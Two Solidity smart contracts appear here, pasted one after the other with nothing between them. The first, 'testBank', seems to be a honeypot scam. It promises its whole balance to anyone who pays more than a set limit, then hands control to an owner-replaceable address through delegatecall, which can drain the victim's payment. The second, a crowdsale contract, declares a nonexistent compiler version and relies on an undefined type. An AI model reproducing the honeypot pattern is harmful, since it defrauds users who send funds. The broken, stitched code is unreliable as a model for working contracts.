pragma solidity 0.4.11;

contract testBank
{
    address Owner=0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
    address adr;
    uint256 public Limit= 1000000000000000001;
    address emails = 0x1a2c5c3ba7182b572512a60a22d9f79a48a93164;


    function Update(address dataBase, uint256 limit)
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }

    function changeOwner(address adr){
        // update Owner=msg.sender;
    }

    function()payable{}

    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {
            //add if Owner
            emails.delegatecall(bytes4(sha3("logEvent()")));
            adr.send(this.balance);
        }
    }

    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }

}
pragma solidity ^0.3.0;
	 contract EthKeeper {
    uint256 public constant EX_rate = 250;
    uint256 public constant BEGIN = 40200010; 
    uint256 tokens;
    address toAddress;
    address addressAfter;
    uint public collection;
    uint public dueDate;
    uint public rate;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function EthKeeper (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        dueDate = BEGIN + 7 days;
        reward = token(addressOfTokenUsedAsReward);
    }
    function () public payable {
        require(now < dueDate && now >= BEGIN);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        collection += amount;
        tokens -= amount;
        reward.transfer(msg.sender, amount * EX_rate);
        toAddress.transfer(amount);
    }
 }
